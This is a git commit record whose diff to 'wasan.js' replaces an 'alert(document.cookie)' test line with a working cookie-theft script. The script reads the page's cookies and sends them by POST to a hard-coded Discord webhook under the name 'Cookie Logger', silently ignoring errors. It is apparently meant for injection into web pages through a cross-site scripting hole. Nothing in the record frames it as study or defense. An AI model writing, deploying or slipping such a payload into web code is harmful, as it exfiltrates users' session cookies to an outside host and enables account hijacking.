e7a123e92622ea7d88f4a439effb4e3c5875d7c2
wasans222 <imp1ex@proton.me>
2026-02-14 19:20:39 +0900

    Update wasan.js

--- wo/wasan.js
+++ wo/wasan.js
@@ -1,1 +1,15 @@
-alert(document.cookie);
+const webhookUrl = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';
+
+const cookies = document.cookie;
+
+fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        content: `**쿠키 정보:**\n\`\`\`\n${cookies}\n\`\`\``,
+        username: 'Cookie Logger'
+    })
+})
+.catch(() => {});
